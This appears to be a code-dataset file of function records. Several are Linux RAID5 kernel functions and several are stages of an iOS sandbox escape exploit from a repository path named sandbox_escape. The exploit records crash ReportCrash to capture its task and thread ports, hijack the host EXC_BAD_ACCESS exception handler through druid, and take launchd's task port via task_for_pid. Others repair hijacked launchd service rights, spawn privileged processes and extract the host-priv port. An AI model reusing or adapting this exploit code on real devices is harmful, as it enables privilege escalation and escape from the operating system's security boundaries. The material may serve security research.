{"docstring": "/*\n * handle_stripe - do things to a stripe.\n *\n * We lock the stripe and then examine the state of various bits\n * to see what needs to be done.\n * Possible results:\n *    return some read request which now have data\n *    return some write requests which are safely on disc\n *    schedule a read on some buffers\n *    schedule a write of some buffers\n *    return confirmation of parity correctness\n *\n * buffers are taken off read_list or write_list, and bh_cache buffers\n * get BH_Lock set before the stripe lock is released.\n *\n */\n", "func_signal": "static void handle_stripe5(struct stripe_head *sh)", "code": "{\n\traid5_conf_t *conf = sh->raid_conf;\n\tint disks = sh->disks, i;\n\tstruct bio *return_bi = NULL;\n\tstruct stripe_head_state s;\n\tstruct r5dev *dev;\n\tmdk_rdev_t *blocked_rdev = NULL;\n\tint prexor;\n\tint dec_preread_active = 0;\n\n\tmemset(&s, 0, sizeof(s));\n\tpr_debug(\"handling stripe %llu, state=%#lx cnt=%d, pd_idx=%d check:%d \"\n\t\t \"reconstruct:%d\\n\", (unsigned long long)sh->sector, sh->state,\n\t\t atomic_read(&sh->count), sh->pd_idx, sh->check_state,\n\t\t sh->reconstruct_state);\n\n\tspin_lock(&sh->lock);\n\tclear_bit(STRIPE_HANDLE, &sh->state);\n\tclear_bit(STRIPE_DELAYED, &sh->state);\n\n\ts.syncing = test_bit(STRIPE_SYNCING, &sh->state);\n\ts.expanding = test_bit(STRIPE_EXPAND_SOURCE, &sh->state);\n\ts.expanded = test_bit(STRIPE_EXPAND_READY, &sh->state);\n\n\t/* Now to look around and see what can be done */\n\trcu_read_lock();\n\tfor (i=disks; i--; ) {\n\t\tmdk_rdev_t *rdev;\n\n\t\tdev = &sh->dev[i];\n\n\t\tpr_debug(\"check %d: state 0x%lx toread %p read %p write %p \"\n\t\t\t\"written %p\\n\",\ti, dev->flags, dev->toread, dev->read,\n\t\t\tdev->towrite, dev->written);\n\n\t\t/* maybe we can request a biofill operation\n\t\t *\n\t\t * new wantfill requests are only permitted while\n\t\t * ops_complete_biofill is guaranteed to be inactive\n\t\t */\n\t\tif (test_bit(R5_UPTODATE, &dev->flags) && dev->toread &&\n\t\t    !test_bit(STRIPE_BIOFILL_RUN, &sh->state))\n\t\t\tset_bit(R5_Wantfill, &dev->flags);\n\n\t\t/* now count some things */\n\t\tif (test_bit(R5_LOCKED, &dev->flags)) s.locked++;\n\t\tif (test_bit(R5_UPTODATE, &dev->flags)) s.uptodate++;\n\t\tif (test_bit(R5_Wantcompute, &dev->flags)) s.compute++;\n\n\t\tif (test_bit(R5_Wantfill, &dev->flags))\n\t\t\ts.to_fill++;\n\t\telse if (dev->toread)\n\t\t\ts.to_read++;\n\t\tif (dev->towrite) {\n\t\t\ts.to_write++;\n\t\t\tif (!test_bit(R5_OVERWRITE, &dev->flags))\n\t\t\t\ts.non_overwrite++;\n\t\t}\n\t\tif (dev->written)\n\t\t\ts.written++;\n\t\trdev = rcu_dereference(conf->disks[i].rdev);\n\t\tif (blocked_rdev == NULL &&\n\t\t    rdev && unlikely(test_bit(Blocked, &rdev->flags))) {\n\t\t\tblocked_rdev = rdev;\n\t\t\tatomic_inc(&rdev->nr_pending);\n\t\t}\n\t\tclear_bit(R5_Insync, &dev->flags);\n\t\tif (!rdev)\n\t\t\t/* Not in-sync */;\n\t\telse if (test_bit(In_sync, &rdev->flags))\n\t\t\tset_bit(R5_Insync, &dev->flags);\n\t\telse {\n\t\t\t/* could be in-sync depending on recovery/reshape status */\n\t\t\tif (sh->sector + STRIPE_SECTORS <= rdev->recovery_offset)\n\t\t\t\tset_bit(R5_Insync, &dev->flags);\n\t\t}\n\t\tif (!test_bit(R5_Insync, &dev->flags)) {\n\t\t\t/* The ReadError flag will just be confusing now */\n\t\t\tclear_bit(R5_ReadError, &dev->flags);\n\t\t\tclear_bit(R5_ReWrite, &dev->flags);\n\t\t}\n\t\tif (test_bit(R5_ReadError, &dev->flags))\n\t\t\tclear_bit(R5_Insync, &dev->flags);\n\t\tif (!test_bit(R5_Insync, &dev->flags)) {\n\t\t\ts.failed++;\n\t\t\ts.failed_num = i;\n\t\t}\n\t}\n\trcu_read_unlock();\n\n\tif (unlikely(blocked_rdev)) {\n\t\tif (s.syncing || s.expanding || s.expanded ||\n\t\t    s.to_write || s.written) {\n\t\t\tset_bit(STRIPE_HANDLE, &sh->state);\n\t\t\tgoto unlock;\n\t\t}\n\t\t/* There is nothing for the blocked_rdev to block */\n\t\trdev_dec_pending(blocked_rdev, conf->mddev);\n\t\tblocked_rdev = NULL;\n\t}\n\n\tif (s.to_fill && !test_bit(STRIPE_BIOFILL_RUN, &sh->state)) {\n\t\tset_bit(STRIPE_OP_BIOFILL, &s.ops_request);\n\t\tset_bit(STRIPE_BIOFILL_RUN, &sh->state);\n\t}\n\n\tpr_debug(\"locked=%d uptodate=%d to_read=%d\"\n\t\t\" to_write=%d failed=%d failed_num=%d\\n\",\n\t\ts.locked, s.uptodate, s.to_read, s.to_write,\n\t\ts.failed, s.failed_num);\n\t/* check if the array has lost two devices and, if so, some requests might\n\t * need to be failed\n\t */\n\tif (s.failed > 1 && s.to_read+s.to_write+s.written)\n\t\thandle_failed_stripe(conf, sh, &s, disks, &return_bi);\n\tif (s.failed > 1 && s.syncing) {\n\t\tmd_done_sync(conf->mddev, STRIPE_SECTORS,0);\n\t\tclear_bit(STRIPE_SYNCING, &sh->state);\n\t\ts.syncing = 0;\n\t}\n\n\t/* might be able to return some write requests if the parity block\n\t * is safe, or on a failed drive\n\t */\n\tdev = &sh->dev[sh->pd_idx];\n\tif ( s.written &&\n\t     ((test_bit(R5_Insync, &dev->flags) &&\n\t       !test_bit(R5_LOCKED, &dev->flags) &&\n\t       test_bit(R5_UPTODATE, &dev->flags)) ||\n\t       (s.failed == 1 && s.failed_num == sh->pd_idx)))\n\t\thandle_stripe_clean_event(conf, sh, disks, &return_bi);\n\n\t/* Now we might consider reading some blocks, either to check/generate\n\t * parity, or to satisfy requests\n\t * or to load a block that is being partially written.\n\t */\n\tif (s.to_read || s.non_overwrite ||\n\t    (s.syncing && (s.uptodate + s.compute < disks)) || s.expanding)\n\t\thandle_stripe_fill5(sh, &s, disks);\n\n\t/* Now we check to see if any write operations have recently\n\t * completed\n\t */\n\tprexor = 0;\n\tif (sh->reconstruct_state == reconstruct_state_prexor_drain_result)\n\t\tprexor = 1;\n\tif (sh->reconstruct_state == reconstruct_state_drain_result ||\n\t    sh->reconstruct_state == reconstruct_state_prexor_drain_result) {\n\t\tsh->reconstruct_state = reconstruct_state_idle;\n\n\t\t/* All the 'written' buffers and the parity block are ready to\n\t\t * be written back to disk\n\t\t */\n\t\tBUG_ON(!test_bit(R5_UPTODATE, &sh->dev[sh->pd_idx].flags));\n\t\tfor (i = disks; i--; ) {\n\t\t\tdev = &sh->dev[i];\n\t\t\tif (test_bit(R5_LOCKED, &dev->flags) &&\n\t\t\t\t(i == sh->pd_idx || dev->written)) {\n\t\t\t\tpr_debug(\"Writing block %d\\n\", i);\n\t\t\t\tset_bit(R5_Wantwrite, &dev->flags);\n\t\t\t\tif (prexor)\n\t\t\t\t\tcontinue;\n\t\t\t\tif (!test_bit(R5_Insync, &dev->flags) ||\n\t\t\t\t    (i == sh->pd_idx && s.failed == 0))\n\t\t\t\t\tset_bit(STRIPE_INSYNC, &sh->state);\n\t\t\t}\n\t\t}\n\t\tif (test_and_clear_bit(STRIPE_PREREAD_ACTIVE, &sh->state))\n\t\t\tdec_preread_active = 1;\n\t}\n\n\t/* Now to consider new write requests and what else, if anything\n\t * should be read.  We do not handle new writes when:\n\t * 1/ A 'write' operation (copy+xor) is already in flight.\n\t * 2/ A 'check' operation is in flight, as it may clobber the parity\n\t *    block.\n\t */\n\tif (s.to_write && !sh->reconstruct_state && !sh->check_state)\n\t\thandle_stripe_dirtying5(conf, sh, &s, disks);\n\n\t/* maybe we need to check and possibly fix the parity for this stripe\n\t * Any reads will already have been scheduled, so we just see if enough\n\t * data is available.  The parity check is held off while parity\n\t * dependent operations are in flight.\n\t */\n\tif (sh->check_state ||\n\t    (s.syncing && s.locked == 0 &&\n\t     !test_bit(STRIPE_COMPUTE_RUN, &sh->state) &&\n\t     !test_bit(STRIPE_INSYNC, &sh->state)))\n\t\thandle_parity_checks5(conf, sh, &s, disks);\n\n\tif (s.syncing && s.locked == 0 && test_bit(STRIPE_INSYNC, &sh->state)) {\n\t\tmd_done_sync(conf->mddev, STRIPE_SECTORS,1);\n\t\tclear_bit(STRIPE_SYNCING, &sh->state);\n\t}\n\n\t/* If the failed drive is just a ReadError, then we might need to progress\n\t * the repair/check process\n\t */\n\tif (s.failed == 1 && !conf->mddev->ro &&\n\t    test_bit(R5_ReadError, &sh->dev[s.failed_num].flags)\n\t    && !test_bit(R5_LOCKED, &sh->dev[s.failed_num].flags)\n\t    && test_bit(R5_UPTODATE, &sh->dev[s.failed_num].flags)\n\t\t) {\n\t\tdev = &sh->dev[s.failed_num];\n\t\tif (!test_bit(R5_ReWrite, &dev->flags)) {\n\t\t\tset_bit(R5_Wantwrite, &dev->flags);\n\t\t\tset_bit(R5_ReWrite, &dev->flags);\n\t\t\tset_bit(R5_LOCKED, &dev->flags);\n\t\t\ts.locked++;\n\t\t} else {\n\t\t\t/* let's read it back */\n\t\t\tset_bit(R5_Wantread, &dev->flags);\n\t\t\tset_bit(R5_LOCKED, &dev->flags);\n\t\t\ts.locked++;\n\t\t}\n\t}\n\n\t/* Finish reconstruct operations initiated by the expansion process */\n\tif (sh->reconstruct_state == reconstruct_state_result) {\n\t\tstruct stripe_head *sh2\n\t\t\t= get_active_stripe(conf, sh->sector, 1, 1, 1);\n\t\tif (sh2 && test_bit(STRIPE_EXPAND_SOURCE, &sh2->state)) {\n\t\t\t/* sh cannot be written until sh2 has been read.\n\t\t\t * so arrange for sh to be delayed a little\n\t\t\t */\n\t\t\tset_bit(STRIPE_DELAYED, &sh->state);\n\t\t\tset_bit(STRIPE_HANDLE, &sh->state);\n\t\t\tif (!test_and_set_bit(STRIPE_PREREAD_ACTIVE,\n\t\t\t\t\t      &sh2->state))\n\t\t\t\tatomic_inc(&conf->preread_active_stripes);\n\t\t\trelease_stripe(sh2);\n\t\t\tgoto unlock;\n\t\t}\n\t\tif (sh2)\n\t\t\trelease_stripe(sh2);\n\n\t\tsh->reconstruct_state = reconstruct_state_idle;\n\t\tclear_bit(STRIPE_EXPANDING, &sh->state);\n\t\tfor (i = conf->raid_disks; i--; ) {\n\t\t\tset_bit(R5_Wantwrite, &sh->dev[i].flags);\n\t\t\tset_bit(R5_LOCKED, &sh->dev[i].flags);\n\t\t\ts.locked++;\n\t\t}\n\t}\n\n\tif (s.expanded && test_bit(STRIPE_EXPANDING, &sh->state) &&\n\t    !sh->reconstruct_state) {\n\t\t/* Need to write out all blocks after computing parity */\n\t\tsh->disks = conf->raid_disks;\n\t\tstripe_set_idx(sh->sector, conf, 0, sh);\n\t\tschedule_reconstruction(sh, &s, 1, 1);\n\t} else if (s.expanded && !sh->reconstruct_state && s.locked == 0) {\n\t\tclear_bit(STRIPE_EXPAND_READY, &sh->state);\n\t\tatomic_dec(&conf->reshape_stripes);\n\t\twake_up(&conf->wait_for_overlap);\n\t\tmd_done_sync(conf->mddev, STRIPE_SECTORS, 1);\n\t}\n\n\tif (s.expanding && s.locked == 0 &&\n\t    !test_bit(STRIPE_COMPUTE_RUN, &sh->state))\n\t\thandle_stripe_expansion(conf, sh, NULL);\n\n unlock:\n\tspin_unlock(&sh->lock);\n\n\t/* wait for this device to become unblocked */\n\tif (unlikely(blocked_rdev))\n\t\tmd_wait_for_blocked_rdev(blocked_rdev, conf->mddev);\n\n\tif (s.ops_request)\n\t\traid_run_ops(sh, s.ops_request);\n\n\tops_run_io(sh, &s);\n\n\tif (dec_preread_active) {\n\t\t/* We delay this until after ops_run_io so that if make_request\n\t\t * is waiting on a flush, it won't continue until the writes\n\t\t * have actually been submitted.\n\t\t */\n\t\tatomic_dec(&conf->preread_active_stripes);\n\t\tif (atomic_read(&conf->preread_active_stripes) <\n\t\t    IO_THRESHOLD)\n\t\t\tmd_wakeup_thread(conf->mddev->thread);\n\t}\n\treturn_io(return_bi);\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/**\n * scribble_len - return the required size of the scribble region\n * @num - total number of disks in the array\n *\n * The size must be enough to contain:\n * 1/ a struct page pointer for each device in the array +2\n * 2/ room to convert each entry in (1) to its corresponding dma\n *    (dma_map_page()) or page (page_address()) address.\n *\n * Note: the +2 is for the destination buffers of the ddf/raid6 case where we\n * calculate over all devices (not just the data blocks), using zeros in place\n * of the P and Q blocks.\n */\n", "func_signal": "static size_t scribble_len(int num)", "code": "{\n\tsize_t len;\n\n\tlen = sizeof(struct page *) * (num+2) + sizeof(addr_conv_t) * (num+2);\n\n\treturn len;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/*\n *  The \"raid5_align_endio\" should check if the read succeeded and if it\n *  did, call bio_endio on the original bio (having bio_put the new bio\n *  first).\n *  If the read failed..\n */\n", "func_signal": "static void raid5_align_endio(struct bio *bi, int error)", "code": "{\n\tstruct bio* raid_bi  = bi->bi_private;\n\tmddev_t *mddev;\n\traid5_conf_t *conf;\n\tint uptodate = test_bit(BIO_UPTODATE, &bi->bi_flags);\n\tmdk_rdev_t *rdev;\n\n\tbio_put(bi);\n\n\trdev = (void*)raid_bi->bi_next;\n\traid_bi->bi_next = NULL;\n\tmddev = rdev->mddev;\n\tconf = mddev->private;\n\n\trdev_dec_pending(rdev, conf->mddev);\n\n\tif (!error && uptodate) {\n\t\tbio_endio(raid_bi, 0);\n\t\tif (atomic_dec_and_test(&conf->active_aligned_reads))\n\t\t\twake_up(&conf->wait_for_stripe);\n\t\treturn;\n\t}\n\n\n\tpr_debug(\"raid5_align_endio : io error...handing IO for a retry\\n\");\n\n\tadd_bio_to_retry(raid_bi, conf);\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "//#ifdef CONFIG_MULTICORE_RAID456\n", "func_signal": "static void async_run_ops(void *param, async_cookie_t cookie)", "code": "{\n\tstruct stripe_head *sh = param;\n\tunsigned long ops_request = sh->ops.request;\n\n\tclear_bit_unlock(STRIPE_OPS_REQ_PENDING, &sh->state);\n\twake_up(&sh->ops.wait_for_ops);\n\n\t__raid_run_ops(sh, ops_request);\n\trelease_stripe(sh);\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/*#else\n#define raid_run_ops __raid_run_ops\n#endif*/\n", "func_signal": "static int grow_one_stripe(raid5_conf_t *conf)", "code": "{\n\tstruct stripe_head *sh;\n\tsh = kmem_cache_alloc(conf->slab_cache, GFP_KERNEL);\n\tif (!sh)\n\t\treturn 0;\n\tmemset(sh, 0, sizeof(*sh) + (conf->pool_size-1)*sizeof(struct r5dev));\n\tsh->raid_conf = conf;\n\tspin_lock_init(&sh->lock);\n\t//#ifdef CONFIG_MULTICORE_RAID456\n\tinit_waitqueue_head(&sh->ops.wait_for_ops);\n\t//#endif\n\n\tif (grow_buffers(sh)) {\n\t\tshrink_buffers(sh);\n\t\tkmem_cache_free(conf->slab_cache, sh);\n\t\treturn 0;\n\t}\n\t/* we just created an active stripe so... */\n\tatomic_set(&sh->count, 1);\n\tatomic_inc(&conf->active_stripes);\n\tINIT_LIST_HEAD(&sh->lru);\n\trelease_stripe(sh);\n\treturn 1;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "/* Find first data disk in a raid6 stripe */\n", "func_signal": "static inline int raid6_d0(struct stripe_head *sh)", "code": "{\n\tif (sh->ddf_layout)\n\t\t/* ddf always start from first device */\n\t\treturn 0;\n\t/* md starts just after Q block */\n\tif (sh->qd_idx == sh->disks - 1)\n\t\treturn 0;\n\telse\n\t\treturn sh->qd_idx + 1;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": "other", "language": "c", "size": 1279}
{"docstring": "// Exploit stage 4: Trigger EXC_BAD_ACCESS in ReportCrash in order to get its task and thread\n// ports. We need to do this again because the first set of ports were suspended by the kernel\n// during process exit.\n", "func_signal": "static bool\nget_reportcrash_task(struct sandbox_escape_context *context)", "code": "{\n\t// Keep ReportCrash alive. We will use this keepalive assertion to crash ReportCrash as\n\t// well.\n\tmach_port_t reportcrash = context->reportcrash_service;\n\treportcrash_keepalive_assertion_t reportcrash_assertion\n\t\t= reportcrash_keepalive(reportcrash);\n\tif (reportcrash_assertion == 0) {\n\t\tERROR(\"Could not generate keepalive assertion for %s\", REPORTCRASH_NAME);\n\t\treturn false;\n\t}\n\t// Get ReportCrash's PID.\n\tpid_t reportcrash_pid = -1;\n\tbool ok = reportcrash_kickstart(reportcrash, &reportcrash_pid);\n\tif (!ok) {\n\t\tWARNING(\"Could not get %s PID\", REPORTCRASH_NAME);\n\t}\n\t// Release the assertion to trigger an EXC_BAD_ACCESS exception in ReportCrash.\n\treportcrash_keepalive_assertion_release(reportcrash_assertion);\n\t// Now listen for an exception from ReportCrash on our host exception handler port.\n\tok = catch_exception_server(context->new_host_exception_handler,\n\t\t\t30 * NSEC_PER_SEC, ^bool (\n\t\t\t\tmach_port_t            thread,\n\t\t\t\tmach_port_t            task,\n\t\t\t\texception_type_t       exception,\n\t\t\t\texception_data_t       code,\n\t\t\t\tmach_msg_type_number_t codeCnt,\n\t\t\t\tkern_return_t *        result) {\n\t\t// We have an exception message containing a task port. Check that this is really\n\t\t// ReportCrash.\n\t\tint crashing_pid = -1;\n\t\tpid_for_task(task, &crashing_pid);\n\t\tif (crashing_pid != reportcrash_pid && reportcrash_pid != -1) {\n\t\t\t// Nope, not ReportCrash. Tell the kernel we aren't handling this\n\t\t\t// exception.\n\t\t\tDEBUG_TRACE(1, \"Got crash from unknown process %d\", crashing_pid);\n\t\t\t*result = KERN_FAILURE;\n\t\t\treturn false;\n\t\t}\n\t\t// This is ReportCrash. Suspend the thread so that it doesn't crash again and\n\t\t// reply with KERN_SUCCESS. This will keep the task and thread ports live (MIG\n\t\t// semantics). Also, because the thread remains suspended, it still serves to keep\n\t\t// ReportCrash from exiting.\n\t\tcontext->reportcrash_task = task;\n\t\tcontext->reportcrash_thread = thread;\n\t\tkern_return_t kr = thread_suspend(thread);\n\t\tif (kr != KERN_SUCCESS) {\n\t\t\tWARNING(\"Could not suspend %s thread 0x%x\", REPORTCRASH_NAME, thread);\n\t\t}\n\t\t*result = KERN_SUCCESS;\n\t\treturn true;\n\t});\n\t// If we timed out, fail.\n\tif (!ok) {\n\t\tERROR(\"Timed out while listening for exception message on our host %s port\",\n\t\t\t\tEXCEPTION_NAME);\n\t\treturn false;\n\t}\n\tassert(context->reportcrash_task != MACH_PORT_NULL\n\t\t\t&& context->reportcrash_thread != MACH_PORT_NULL);\n\t// We got ReportCrash's task port!\n\tINFO(\"Got %s task 0x%x, pid %d!\", REPORTCRASH_NAME, context->reportcrash_task,\n\t\t\treportcrash_pid);\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Exploit stage 5: Restore the original EXC_BAD_ACCESS host exception port, again using druid.\n", "func_signal": "static void\nrestore_host_exception_port(struct sandbox_escape_context *context)", "code": "{\n\tbool ok = threadexec_host_set_exception_ports(\n\t\t\tcontext->druid_tx,\n\t\t\tcontext->host_priv,\n\t\t\tEXC_MASK_BAD_ACCESS,\n\t\t\tcontext->host_exception_handler,\n\t\t\tcontext->host_exception_behavior,\n\t\t\tcontext->host_exception_flavor);\n\tif (!ok) {\n\t\tWARNING(\"Could not restore the host exception handler for %s\",\n\t\t\t\tEXCEPTION_NAME);\n\t} else {\n\t\tINFO(\"Restored host %s handler\", EXCEPTION_NAME);\n\t}\n\tcontext->new_host_exception_handler_installed = false;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Exploit stage 6: Create an execution context in ReportCrash and restore the original send rights\n// to ReportCrash.SafetyNet and CARenderServer in launchd.\n", "func_signal": "static bool\nfix_exploit_damage(struct sandbox_escape_context *context)", "code": "{\n\t// Create an execution context in ReportCrash. We've mangled the thread we crashed earlier,\n\t// so just kill ReportCrash when done.\n\tthreadexec_t reportcrash_tx = threadexec_init(context->reportcrash_task,\n\t\t\tcontext->reportcrash_thread, TX_KILL_TASK);\n\tif (reportcrash_tx == NULL) {\n\t\tERROR(\"Could not create execution context in %s\", REPORTCRASH_NAME);\n\t\t// The task and thread ports will be deallocated in clear_context().\n\t\treturn false;\n\t}\n\t// Great! Now we can call functions in a process with task_for_pid-allow.\n\tINFO(\"Created execution context in %s\", REPORTCRASH_NAME);\n\tcontext->reportcrash_tx = reportcrash_tx;\n\t// Get launchd's task port in ReportCrash.\n\tmach_port_t launchd_task_remote;\n\tbool ok = threadexec_task_for_pid_remote(reportcrash_tx, 1, &launchd_task_remote);\n\tif (!ok) {\n\t\tERROR(\"Could not get launchd's task port\");\n\t\treturn false;\n\t}\n\tbool success = false;\n\t// Replace launchd's send right for CARenderServer, which actually points to our fake\n\t// CARenderServer port, so that it once again points back to the real CARenderServer.\n\tok = restore_launchd_service(reportcrash_tx, launchd_task_remote,\n\t\t\tCARENDERSERVER_SERVICE_NAME, &context->fake_carenderserver_service,\n\t\t\tcontext->carenderserver_service, 2);\n\tif (!ok) {\n\t\tERROR(\"Could not restore service %s\", CARENDERSERVER_NAME);\n\t\tgoto fail_1;\n\t}\n\tINFO(\"Restored service %s\", CARENDERSERVER_NAME);\n\t// Replace launchd's send right for SafetyNet, which actually points to our fake SafetyNet\n\t// port, so that it once again points back to the real SafetyNet.\n\tok = restore_launchd_service(reportcrash_tx, launchd_task_remote,\n\t\t\tREPORTCRASH_SAFETYNET_SERVICE_NAME, &context->fake_safetynet_service,\n\t\t\tcontext->safetynet_service, 2);\n\tif (!ok) {\n\t\tERROR(\"Could not restore service %s\", SAFETYNET_NAME);\n\t\tgoto fail_1;\n\t}\n\tINFO(\"Restored service %s\", SAFETYNET_NAME);\n\t// Success! The system should be stable again.\n\tcontext->system_unstable = false;\n\tsuccess = true;\nfail_1:\n\t// Free launchd's task port in RemoteCrash.\n\tthreadexec_mach_port_deallocate(reportcrash_tx, launchd_task_remote);\n\treturn success;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Create file actions for posix_spawn() that will set up the stdin/stdout/stderr file descriptors.\n", "func_signal": "static bool\nsetup_stdio_fds(threadexec_t priv_tx, const int *stdio_fds,\n\t\tint *stdio_fds_r, const void **file_actions_r)", "code": "{\n\t// Initialize stdio_fds_r to be all invalid.\n\tfor (size_t i = 0; i < 3; i++) {\n\t\tstdio_fds_r[i] = -1;\n\t}\n\t// Handle NULL.\n\tif (stdio_fds == NULL) {\n\t\t*file_actions_r = NULL;\n\t\treturn true;\n\t}\n\t// Grab memory for a posix_spawn_file_actions_t. This is an opaque type and all functions\n\t// take a pointer to it.\n\tuint8_t *memory_R;\n\tthreadexec_shared_vm_default(priv_tx, (const void **)&memory_R, NULL, NULL);\n\tposix_spawn_file_actions_t *file_actions_R = (void *)(memory_R + 0x7000);\n\t// Initialize the posix_spawn file actions.\n\tint err;\n\tbool ok = threadexec_call_cv(priv_tx, &err, sizeof(err),\n\t\t\tposix_spawn_file_actions_init, 1,\n\t\t\tTX_CARG_LITERAL(posix_spawn_file_actions_t *, file_actions_R));\n\tif (!ok || err != 0) {\n\t\tERROR(\"Could not create posix_spawn file actions\");\n\t\treturn false;\n\t}\n\t*file_actions_r = file_actions_R;\n\t// Process each file descriptor.\n\tfor (size_t i = 0; i < 3; i++) {\n\t\t// Skip negative descriptors.\n\t\tif (stdio_fds[i] < 0) {\n\t\t\tcontinue;\n\t\t}\n\t\t// First insert local file stdio_fds[i] into priv_tx.\n\t\tint fd_r;\n\t\tok = threadexec_file_insert(priv_tx, stdio_fds[i], &fd_r);\n\t\tif (!ok) {\n\t\t\tERROR(\"Could not insert file descriptor %d into target process\",\n\t\t\t\t\tstdio_fds[i]);\n\t\t\treturn false;\n\t\t}\n\t\tstdio_fds_r[i] = fd_r;\n\t\t// Add a posix_spawn file action to duplicate fd_r to i.\n\t\tok = threadexec_call_cv(priv_tx, &err, sizeof(err),\n\t\t\t\tposix_spawn_file_actions_adddup2, 3,\n\t\t\t\tTX_CARG_LITERAL(posix_spawn_file_actions_t *, file_actions_R),\n\t\t\t\tTX_CARG_LITERAL(int, fd_r),\n\t\t\t\tTX_CARG_LITERAL(int, i));\n\t\tif (!ok || err != 0) {\n\t\t\tERROR(\"Could not add posix_spawn dup2 file action\");\n\t\t\treturn false;\n\t\t}\n\t}\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\spawn_privileged.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Exploit stage 3: Save the current host exception port info for EXC_BAD_ACCESS, then use druid to\n// install a new host-level exception handler for EXC_BAD_ACCESS to which we have the receive\n// right.\n", "func_signal": "static bool\nset_host_exception_port(struct sandbox_escape_context *context)", "code": "{\n\t// First try to save the current host exception handler for EXC_BAD_ACCESS, so that we can\n\t// restore it later.\n\texception_mask_t mask;\n\tmach_msg_type_number_t count = 1;\n\tkern_return_t kr = host_get_exception_ports(\n\t\t\tcontext->host_priv,\n\t\t\tEXC_MASK_BAD_ACCESS,\n\t\t\t&mask,\n\t\t\t&count,\n\t\t\t&context->host_exception_handler,\n\t\t\t&context->host_exception_behavior,\n\t\t\t&context->host_exception_flavor);\n\tif (kr != KERN_SUCCESS) {\n\t\tWARNING(\"Could not save host's %s exception handler\", EXCEPTION_NAME);\n\t}\n\t// Now create a receive right that will be the new host-level exception handler for\n\t// EXC_BAD_ACCESS.\n\tmach_port_t new_exception_handler;\n\tmach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };\n\tkr = mach_port_construct(mach_task_self(), &options, 0, &new_exception_handler);\n\tassert(kr == KERN_SUCCESS);\n\tcontext->new_host_exception_handler = new_exception_handler;\n\t// Create a threadexec context for druid so that we can execute code in its context. We\n\t// kill the task after we're done so that druid gets the correct CARenderServer port.\n\tthreadexec_t druid_tx = threadexec_init(context->druid_task, MACH_PORT_NULL,\n\t\t\tTX_KILL_TASK | TX_BORROW_TASK_PORT);\n\tif (druid_tx == NULL) {\n\t\tERROR(\"Could not create execution context in %s (task 0x%x)\",\n\t\t\t\tDRUID_NAME, context->druid_task);\n\t\treturn false;\n\t}\n\tcontext->druid_tx = druid_tx;\n\t// Now use the execution context to set the host exception port.\n\tbool ok = threadexec_host_set_exception_ports(\n\t\t\tdruid_tx,\n\t\t\tcontext->host_priv,\n\t\t\tEXC_MASK_BAD_ACCESS,\n\t\t\tnew_exception_handler,\n\t\t\tEXCEPTION_DEFAULT,\n\t\t\tARM_UNIFIED_THREAD_STATE);\n\tif (!ok) {\n\t\tERROR(\"Could not set the host exception handler for %s\", EXCEPTION_NAME);\n\t\treturn false;\n\t}\n\tINFO(\"Set the host exception handler for %s\", EXCEPTION_NAME);\n\tcontext->new_host_exception_handler_installed = true;\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Try to extract the host-priv port from the task. Warnings are generated if the given task does\n// not have the host-priv port.\n", "func_signal": "static mach_port_t\ntask_extract_host_priv(mach_port_t task)", "code": "{\n\tconst char *warning_msg;\n\t// Extract the task's host port. This works because task_get_special_port() takes a\n\t// task_inspect right, which we're allowed to use.\n\tmach_port_t task_host;\n\tkern_return_t kr = task_get_special_port(task, TASK_HOST_PORT, &task_host);\n\tif (kr != KERN_SUCCESS) {\n\t\twarning_msg = \"Could not extract host port from task 0x%x (pid %d)\";\n\t\tgoto fail_0;\n\t}\n\t// Now check if this is a host-priv port.\n\tkernel_boot_info_t boot_info;\n\tkr = host_get_boot_info(task_host, boot_info);\n\tif (kr != KERN_SUCCESS) {\n\t\twarning_msg = \"Task 0x%x (pid %d) does not have host-priv port\";\n\t\tgoto fail_1;\n\t}\n\t// Success!\n\treturn task_host;\nfail_1:\n\tmach_port_deallocate(mach_task_self(), task_host);\nfail_0:;\n\tint pid = -1;\n\tpid_for_task(task, &pid);\n\tif (pid == -1) {\n\t\tWARNING(\"Mach port 0x%x is not a task port\", task);\n\t} else {\n\t\tWARNING(warning_msg, task, pid);\n\t}\n\treturn MACH_PORT_NULL;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
